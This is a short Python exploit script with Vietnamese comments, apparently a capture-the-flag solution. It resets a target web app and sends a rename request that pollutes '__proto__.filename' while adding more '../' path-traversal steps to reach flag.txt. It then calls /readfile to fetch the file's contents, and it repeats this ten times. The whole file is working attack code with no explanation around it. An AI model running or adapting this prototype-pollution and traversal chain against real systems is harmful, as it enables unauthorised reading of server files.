import requests

base_url = input("Nhập base_url: ")


def send_get_request(endpoint):
    url = base_url + endpoint
    response = requests.get(url)
    return response.text


# Lặp lại 10 lần
for i in range(10):

    print(f"---------------------- {i+1} -----------------------------")

    # Bước 1: /test?func=reset
    response1 = send_get_request("test?func=reset")
    print(f"Step 1 - Iteration {i + 1} Response: {response1}")

    # Bước 2: /test?func=rename&filename=__proto__.filename&rename=../../../flag.txt
    # Thêm i lần '../' vào rename
    rename_param = "../" * (i+1) + "flag.txt"

    # Gửi request với rename mới
    response2 = send_get_request(f"test?func=rename&filename=__proto__.filename&rename={rename_param}")
    print(f"Step 2 - Iteration {i + 1} Response: {response2}")

    # Bước 3: /readfile
    response3 = send_get_request("readfile")
    print(f"Step 3 - Iteration {i + 1} Response: {response3}")

